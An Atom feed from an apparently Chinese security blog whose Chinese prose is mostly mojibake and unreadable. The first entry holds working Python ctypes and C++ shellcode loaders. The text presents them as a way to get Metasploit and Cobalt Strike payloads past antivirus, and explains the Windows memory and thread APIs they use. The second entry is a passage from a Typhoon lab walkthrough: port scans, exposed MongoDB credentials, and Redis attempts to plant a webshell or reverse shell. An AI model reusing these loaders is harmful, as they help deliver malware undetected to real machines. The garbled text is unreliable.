<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ä¸å¦‚èŒ¶é…’ä¼´</title>
  
  <subtitle>å¤§é£èµ·å…®ï¼</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://t43wiu6.github.io/"/>
  <updated>2019-12-25T02:24:06.090Z</updated>
  <id>https://t43wiu6.github.io/</id>
  
  <author>
    <name>t43wiu6</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ShellCodeåŠ è½½å™¨çš„æ¢ç´¢ä¸å­¦ä¹ </title>
    <link href="https://t43wiu6.github.io/2019/12/20/ShellCode-Loader/"/>
    <id>https://t43wiu6.github.io/2019/12/20/ShellCode-Loader/</id>
    <published>2019-12-20T12:39:32.000Z</published>
    <updated>2019-12-25T02:24:06.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ShellCode-Loader"><a href="#ShellCode-Loader" class="headerlink" title="ShellCode Loader"></a>ShellCode Loader</h2><p><img src="/2019/12/20/ShellCode-Loader/3.png" alt=""></p><blockquote><p>å½“ç›®æ ‡æœºä¸Šå­˜åœ¨æ€è½¯æ—¶ï¼ŒMSF/CSé»˜è®¤ç”Ÿæˆçš„Payloadæå¤§æ¦‚ç‡ä¼šè¢«Killæ‰ï¼Œè¿™æ ·å°±å¾ˆéš¾å—äº†ã€‚<br>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªèƒ½å…æ€åŠ è½½Payloadçš„ç¨‹åºäº†ï¼Œæ”»é˜²å‘æ¥éƒ½æ˜¯åŠ¨æ€çš„ï¼Œåªæœ‰æŠŠæ¡åŸç†è‡ªè¡Œè¡ç”Ÿæ‘¸ç´¢æ‰æ˜¯æ­£é“ã€‚</p></blockquote><a id="more"></a><h2 id="Pythonï¼Ÿ"><a href="#Pythonï¼Ÿ" class="headerlink" title="Pythonï¼Ÿ"></a>Pythonï¼Ÿ</h2><p>ä¸€å®šè¦ç”¨pyhtonå—ï¼Œä¸ºå•¥è¦ç”¨pythonå‘¢ï¼Ÿ<br>å®é™…ä¸Šctypeså‡½æ•°çš„åŸå‹éƒ½æ˜¯c++å‡½æ•°ï¼Œä¹‹æ‰€ä»¥ä½¿ç”¨pythonæ¥æ‰“åŒ…ï¼Œè€ƒè™‘åˆ°åé—¨è¯­è¨€ç¼–è¯‘è‡ªå¸¦çš„ä¸€äº›å…æ€å…‰ç¯.</p><p>åŠ è½½å™¨è¿™ä¸ªä¸œè¥¿å¾ˆå¤šè¯­è¨€éƒ½å¯ä»¥å®ç°ï¼Œæ¯”å¦‚:</p><ul><li>[go-shellcode] <a href="https://github.com/brimstone/go-shellcode" target="_blank" rel="noopener">https://github.com/brimstone/go-shellcode</a> </li><li>[c#]  <a href="https://github.com/cribdragg3r/Simple-Loader" target="_blank" rel="noopener">https://github.com/cribdragg3r/Simple-Loader</a> </li><li>c++</li></ul><p>ä»¥ä¸Šä¸¾ä¾‹æœ‰éƒ¨åˆ†å¹¶ä¸å®Œå–„ï¼Œä½†ä½œæ¦‚å¿µéªŒè¯è¶³ä»¥ã€‚<br>å†æ¥åº·åº·æœ€è¿‘ç½‘ä¸Šå…¬å¼€çš„å‡ ä¸ªä»£ç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä»…python2</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">shellcode = bytearray(payload)</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(<span class="number">-1</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">""</span></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, len(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, <span class="number">-1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line"><span class="comment">#libc = CDLL('libc.so.6')</span></span><br><span class="line">PROT_READ = <span class="number">1</span></span><br><span class="line">PROT_WRITE = <span class="number">2</span></span><br><span class="line">PROT_EXEC = <span class="number">4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">executable_code</span><span class="params">(buffer)</span>:</span></span><br><span class="line">    buf = c_char_p(buffer)</span><br><span class="line">    size = len(buffer)</span><br><span class="line">    addr = libc.valloc(size)</span><br><span class="line">    addr = c_void_p(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == addr: </span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to allocate memory"</span>)</span><br><span class="line">    memmove(addr, buf, size)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"Failed to set protection on buffer"</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span><br><span class="line">shellcode = bytearray(buf)</span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()   </span><br><span class="line"><span class="keyword">if</span> whnd != <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">              ctypes.windll.user32.ShowWindow(whnd, <span class="number">0</span>)   </span><br><span class="line">              ctypes.windll.kernel32.CloseHandle(whnd)</span><br><span class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">old = ctypes.c_long(<span class="number">1</span>)</span><br><span class="line">VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p>åŸç†éƒ½æ˜¯é€šè¿‡ctypesåº“åœ¨å†…å­˜æ³¨å…¥shellcodeï¼Œåªè¦é€šè¿‡pyinstallæ‰“åŒ…ä¸ºexe</p><p>ï¼ˆå¯¹pyç‰ˆæœ¬æœ‰è¦æ±‚ï¼Œå¦åˆ™æŠ¥é”™ï¼Œå¦‚æˆ‘çš„3.7.3æŠ¥é”™äº†ï¼‰</p><h2 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a>ctypes</h2><p>[pythonå®˜æ–¹æ–‡æ¡£]  <a href="https://docs.python.org/3/library/ctypes.html" target="_blank" rel="noopener">https://docs.python.org/3/library/ctypes.html</a> </p><p><img src="1.png" alt="image-20191107102608459"></p><p>åœ¨å®˜æ–¹æ–‡æ¡£ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¯¹åº”çš„æ•°æ®ç±»å‹</p><p>æå–ä¸€ä¸‹æ ¸å¿ƒå‡½æ•°</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">VirtualAlloc(<span class="number">0</span>, len(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">VirtualProtect(memorywithshell,ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line">RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))</span><br><span class="line">CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">WaitForSingleObject(handle, <span class="number">-1</span>)</span><br></pre></td></tr></table></figure><h2 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h2><p>å¼•ç”¨ä¸€ä¸‹<code>rcoil</code>å¤§ä½¬çš„åŸè¯</p><blockquote><p> <code>Cobalt Strike</code> æä¾›äº†ä¸¤ç§åœ¨è¿œç¨‹è¿›ç¨‹ä¸­åˆ†é…å†…å­˜å¹¶å°†æ•°æ®å¤åˆ¶åˆ°å…¶ä¸­çš„é€‰é¡¹ï¼Œè€Œå…¶ä¸­é»˜è®¤ä½¿ç”¨é¡¹å°±æ˜¯ä½¿ç”¨äº† <strong>VirtualAllocEx</strong> -&gt; <strong>WriteProcessMemory</strong> çš„ç»å…¸æ¨¡å¼ï¼Œè¿™æ¨¡å¼ä¹Ÿæ˜¯çº¢é˜Ÿå·¥å…·ä¸­æœ€å¸¸è§çš„æ¨¡å¼ã€‚æ­¤æ¨¡å¼ä¹Ÿé€‚ç”¨äºä¸åŒçš„è¿›ç¨‹ä½“ç³»ç»“æ„ã€‚ </p></blockquote><p>è€Œè¿™é‡Œçš„<strong>VirtualAlloc</strong>ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œä¸è¿‡<strong>VirtualAllocEx</strong> æ˜¯åœ¨å¦ä¸€ä¸ªè¿›ç¨‹åˆ†é…å†…å­˜<strong>VirtualAlloc</strong>åˆ™åœ¨æœ¬è¿›ç¨‹ï¼Œå…¶å‡½æ•°åŸå‹ä¸º</p><p><img src="2.png" alt="image-20191107105243022"></p><ul><li><p><code>lpAddress</code>  è¦åˆ†é…çš„åŒºåŸŸçš„èµ·å§‹åœ°å€</p></li><li><p><code>dwSize</code> è¦åˆ†é…çš„å¤§å°, ä»¥å­—èŠ‚ä¸ºå•ä½</p></li><li><p><code>flAllocationType</code>  å†…å­˜åˆ†é…çš„ç±»å‹,å…·ä½“ç±»å‹ç§ç±»å¯ä»¥è‡ªè¡ŒæŸ¥çœ‹</p><p> <a href="https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN</a></p></li><li><p><code>flProtect</code> å¯¹è¦åˆ†é…çš„é¡µé¢åŒºåŸŸçš„å†…å­˜ä¿æŠ¤</p></li></ul><h2 id="RtlMoveMemory"><a href="#RtlMoveMemory" class="headerlink" title="RtlMoveMemory"></a>RtlMoveMemory</h2><blockquote><p> å°†æºå†…å­˜å—çš„å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡å†…å­˜å— </p></blockquote><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">RtlMoveMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _Out_       VOID UNALIGNED *Destination,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  <span class="keyword">const</span> VOID UNALIGNED *Source,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_        SIZE_T         Length</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><code>Destination</code> æŒ‡å‘è¦å¤åˆ¶å­—èŠ‚çš„ç›®æ ‡å­˜å‚¨å—çš„æŒ‡é’ˆã€‚ </li><li><code>Source</code> æŒ‡å‘è¦å¤åˆ¶å­—èŠ‚çš„ç›®æ ‡å­˜å‚¨å—çš„æŒ‡é’ˆã€‚ </li><li><code>Length</code>ä»æºå¤åˆ¶åˆ°ç›®æ ‡çš„å­—èŠ‚æ•°ã€‚ </li></ul><h2 id="VirualProtect"><a href="#VirualProtect" class="headerlink" title="VirualProtect"></a>VirualProtect</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="function"><span class="params">  PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><code>flNewProtect</code>  å†…å­˜ä¿æŠ¤é€‰é¡¹ </li><li><code>lpflOldProtect</code>  æŒ‡å‘å˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡æ¥æ”¶é¡µé¢çš„æŒ‡å®šåŒºåŸŸä¸­ç¬¬ä¸€é¡µçš„å…ˆå‰è®¿é—®ä¿æŠ¤å€¼ã€‚ </li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç¤ºä¾‹</span></span><br><span class="line">VirtualProtect(memorywithshell,ctypes.c_int(len(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br></pre></td></tr></table></figure><h2 id="CreateThread"><a href="#CreateThread" class="headerlink" title="CreateThread"></a>CreateThread</h2><blockquote><p> åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ä»¥åœ¨è°ƒç”¨è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´å†…æ‰§è¡Œ</p></blockquote><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  __drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD                 lpThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><code>lpThreadAttributes</code> æè¿°æ˜¯å¦å¯ä»¥ç”±å­è¿›ç¨‹ç»§æ‰¿ </li><li><code>dwStackSize</code> å †æ ˆçš„åˆå§‹å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ , å‚æ•°ä¸º0ï¼Œåˆ™ä½¿ç”¨å¯æ‰§è¡Œæ–‡ä»¶çš„é»˜è®¤å¤§å° (1MB)</li><li><p><code>lpStartAddress</code>  è¯¥æŒ‡é’ˆè¡¨ç¤ºçº¿ç¨‹çš„èµ·å§‹åœ°å€ </p></li><li><p><code>lpParameter</code> æŒ‡å‘è¦ä¼ é€’ç»™çº¿ç¨‹çš„å˜é‡çš„æŒ‡é’ˆ </p></li><li><code>dwCreationFlags</code>  æ§åˆ¶çº¿ç¨‹åˆ›å»ºçš„æ ‡å¿—ï¼Œ0ä¸ºåˆ›å»ºåç«‹å³æ‰§è¡Œ</li><li><code>lpThreadId</code> æŒ‡å‘æ¥æ”¶çº¿ç¨‹æ ‡è¯†ç¬¦çš„å˜é‡çš„æŒ‡é’ˆï¼Œä¸º <strong>NULL</strong>ï¼Œåˆ™ä¸è¿”å›çº¿ç¨‹æ ‡è¯†ç¬¦</li></ul><h2 id="WaitForSingleObject"><a href="#WaitForSingleObject" class="headerlink" title="WaitForSingleObject"></a>WaitForSingleObject</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p><code>hHandle</code> å¯¹è±¡çš„å¥æŸ„ </p></li><li><p><code>dwMilliseconds</code>  è¶…æ—¶æ—¶é—´é—´éš”ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰  </p><p>å¦‚æœæŒ‡å®šäº†éé›¶å€¼ï¼Œåˆ™å‡½æ•°å°†ç­‰å¾…ç›´åˆ°å‘å‡ºä¿¡å·é€šçŸ¥å¯¹è±¡æˆ–é—´éš”è¿‡å» </p></li></ul><h2 id="C-åŸå‹"><a href="#C-åŸå‹" class="headerlink" title="C++åŸå‹"></a>C++åŸå‹</h2><p>å¾ˆæ˜¾ç„¶è¿™äº›åŠ è½½å™¨çš„è¿‡ç¨‹éƒ½æ˜¯å¤§åŒå°å¼‚ï¼Œæ ¸å¿ƒå°±æ˜¯ä»¥ä¸‹æµç¨‹</p><ul><li>é€šè¿‡<strong>VirtualAlloc</strong> \ <strong>VirtualAllocEx</strong>åˆ†é…å†…å­˜</li><li>é€šè¿‡<strong>RtlMoveMemory</strong> \ <strong>RtlCopyMemory</strong>å°†Shellcodeå¤åˆ¶æˆ–ç§»åŠ¨åˆ°å·²åˆ†é…å†…å­˜ä¸­<br>ï¼ˆC++ä¸­å¯ç®€å†™ä¸ºmemcpy\memoveï¼‰</li><li>ä½¿ç”¨<strong>CreateThread</strong>åœ¨å­çº¿ç¨‹ä¸­è¿è¡Œ<blockquote><p>å½“ç„¶å¦‚æœä½¿ç”¨<strong>VirtualAllocEx</strong>å°±ä¸éœ€è¦ä½¿ç”¨<strong>CreateThread</strong>äº†</p></blockquote></li></ul><p>è¿™é‡Œè´´ä¸€ä¸‹è¿™äº›å˜å½¢å‡½æ•°çš„<code>c++</code>åŸå‹</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/subsystem:\"windows\" /entry:\"mainCRTStartup\""</span>)<span class="comment">//è¿è¡Œä¸æ˜¾ç¤ºçª—å£</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™é‡Œæ”¾shellcode</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">void</span>* buffer)</span> </span>&#123;</span><br><span class="line"><span class="keyword">void</span>(*function)();</span><br><span class="line">function = (<span class="keyword">void</span> (*)())buffer;</span><br><span class="line">function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPVOID ptr = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">RtlMoveMemory(ptr, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">LPVOID ht = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)&amp;run, ptr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">WaitForSingleObject(ht, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>PS:è¿™ä¸ªåŸå‹æ¨¡æ¿ç¼–è¯‘å‡ºæ¥çš„exeå·²ç»è¢«ä¸»æµæ€è½¯æ€æ‰äº†ï¼Œè¿™é‡Œé„™è§†ä¸‹360ã€‚åŸå› ä½ æ‡‚çš„</p></blockquote><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¯´ç‚¹é¢˜å¤–è¯ï¼Œ<code>cobaltstrike4.0</code>ä¸­ï¼Œæ ¹æ®å…¶å±•ç¤ºçš„è§†é¢‘ï¼Œä½œè€…å°†<code>VirtualAlloc</code>æ›¿æ¢ä¸ºäº†<code>HeadCreate</code> <code>ByPass</code>äº†Win10çš„Defenderã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ShellCode-Loader&quot;&gt;&lt;a href=&quot;#ShellCode-Loader&quot; class=&quot;headerlink&quot; title=&quot;ShellCode Loader&quot;&gt;&lt;/a&gt;ShellCode Loader&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2019/12/20/ShellCode-Loader/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å½“ç›®æ ‡æœºä¸Šå­˜åœ¨æ€è½¯æ—¶ï¼ŒMSF/CSé»˜è®¤ç”Ÿæˆçš„Payloadæå¤§æ¦‚ç‡ä¼šè¢«Killæ‰ï¼Œè¿™æ ·å°±å¾ˆéš¾å—äº†ã€‚&lt;br&gt;è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªèƒ½å…æ€åŠ è½½Payloadçš„ç¨‹åºäº†ï¼Œæ”»é˜²å‘æ¥éƒ½æ˜¯åŠ¨æ€çš„ï¼Œåªæœ‰æŠŠæ¡åŸç†è‡ªè¡Œè¡ç”Ÿæ‘¸ç´¢æ‰æ˜¯æ­£é“ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="æ¸—é€æµ‹è¯•" scheme="https://t43wiu6.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="æ€è½¯å¯¹æŠ—" scheme="https://t43wiu6.github.io/tags/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>æ¸—é€å®æˆ˜:Typhooné¶æœºå…¥ä¾µ</title>
    <link href="https://t43wiu6.github.io/2019/04/19/Typhoon/"/>
    <id>https://t43wiu6.github.io/2019/04/19/Typhoon/</id>
    <published>2019-04-19T13:48:50.000Z</published>
    <updated>2019-04-20T06:07:29.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><ul><li>ç›®æ ‡ï¼šroot</li><li>ä½œè€…ï¼šPrismaCSI</li><li>éš¾åº¦å®šä½ï¼šæ— </li></ul><blockquote><p>æ¸—é€è¿‡ç¨‹ä¸­ç»å†äº†å¥½å‡ æ¬¡æ¢ç¯å¢ƒï¼ŒIPåœ°å€æœ‰ç‚¹æ··ä¹±ï¼Œè¯·ä½“è°…</p></blockquote><h1 id="MongoDBæœªæˆæƒè®¿é—®"><a href="#MongoDBæœªæˆæƒè®¿é—®" class="headerlink" title="MongoDBæœªæˆæƒè®¿é—®"></a>MongoDBæœªæˆæƒè®¿é—®</h1><a id="more"></a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">21/tcp    open  ftp         vsftpd 3.0.2</span><br><span class="line">22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">110/tcp   open  pop3        DovMarkdown Theme Kitecot pop3d</span><br><span class="line">111/tcp   open  rpcbind     2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp   open  imap        Dovecot imapd (Ubuntu)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">631/tcp   open  ipp         CUPS 1.7</span><br><span class="line">993/tcp   open  ssl/imaps?</span><br><span class="line">995/tcp   open  ssl/pop3s?</span><br><span class="line">2049/tcp  open  nfs_acl     2-3 (RPC <span class="comment">#100227)</span></span><br><span class="line">3306/tcp  open  mysql       MySQL (unauthorized)</span><br><span class="line">5432/tcp  open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5</span><br><span class="line">6379/tcp  open  redis       Redis key-value store 4.0.11</span><br><span class="line">8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">27017/tcp open  mongodb     MongoDB 3.0.15</span><br><span class="line">33867/tcp open  nlockmgr    1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">35717/tcp open  mountd      1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">38819/tcp open  mountd      1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">49775/tcp open  mountd      1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">58730/tcp open  status      1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰è¾ƒå¤šæœåŠ¡<br>é‚£ä¹ˆè·‘ç›®å½•èµ°èµ·ï¼Œå‘ç°æœ‰<code>mongoadmin</code><br><img src="mongoadmin.PNG" alt="mongoadmin"></p><blockquote><p>username : typhoon<br>password : 789456123</p></blockquote><p>æ€»å…±æœ‰ä¸¤ä¸ªé›†åˆï¼Œcredså’Œtyphoonï¼Œè´¦å·å¯†ç æ˜¯credsä¸‹çš„ï¼Œæç¤ºå¾ˆæ˜æ˜¾äº†<br>åæ‰‹ä¸€ä¸ªSSH</p><p><img src="ssh.PNG" alt="ssh"></p><p>å°±è¿™ä¹ˆæ²¡äº†????<br>äº‹å®ä¸Šâ€¦å®é™…çš„åˆ©ç”¨é“¾å½“ç„¶ä¸æ˜¯è¿™æ ·å­</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.201.6</span><br></pre></td></tr></table></figure><p>å…ˆå°è¯•ä¸‹ä¸€èˆ¬çš„åˆ©ç”¨ï¼Œåœ¨ä½æƒé™æ—¶å†™ğŸ</p><p><img src="mongodb.PNG" alt="mongodb"></p><p>ä½†æ˜¯è®¿é—®é¡µé¢æ˜¯500ï¼Œå°è¯•å†™å…¥phpçš„åå¼¹shellï¼Œè¿˜æ˜¯500</p><p><img src="shell.PNG" alt="shell"></p><p>å¼€ä¸‹å¤–æŒ‚çœ‹çœ‹æ€ä¹ˆå›äº‹ï¼Œwtfï¼Ÿè¿™ä¸ªæƒé™660ï¼Œå…¶ä»–ç”¨æˆ·è¯»ä¸äº†ï¼Œå°´å°¬ğŸ˜…<br>å°è¯•crontabè®¡åˆ’ä»»åŠ¡å¼¹shellå’Œå†™sshå…¬é’¥å‡å› ä¸ºæƒé™é—®é¢˜å¤±è´¥</p><p>çªå‘å¥‡æƒ³ï¼Œæƒé™ä¸å¤Ÿ?ï¼Œé‚£æˆ‘å†™rootçš„ï¼Œæˆ–è®¸è¿è¡Œrootç™»å½•å‘¢<br>å°è¯•å†™å…¥ç¯¡æ”¹rootç”¨æˆ·çš„å…¬é’¥â€¦ç„¶è€Œè¿˜æ˜¯éœ€è¦å¯†ç Orz</p><h1 id="æœåŠ¡ç«¯SSTI"><a href="#æœåŠ¡ç«¯SSTI" class="headerlink" title="æœåŠ¡ç«¯SSTI"></a>æœåŠ¡ç«¯SSTI</h1><p>è¿™ä¸ªé¶æœºæ˜¯æœ‰å¤šä¸ªGetShellæ–¹æ³•çš„ï¼Œæˆ‘å°½é‡å°è¯•æŠŠå®ƒä»¬éƒ½æ‰¾å‡ºæ¥</p><p><img src="dvwa.PNG" alt="dvwa"></p><p>æ²¡æƒ³åˆ°è¿˜ç»™é…äº†ä¸ªDVWAç»ƒä¹ 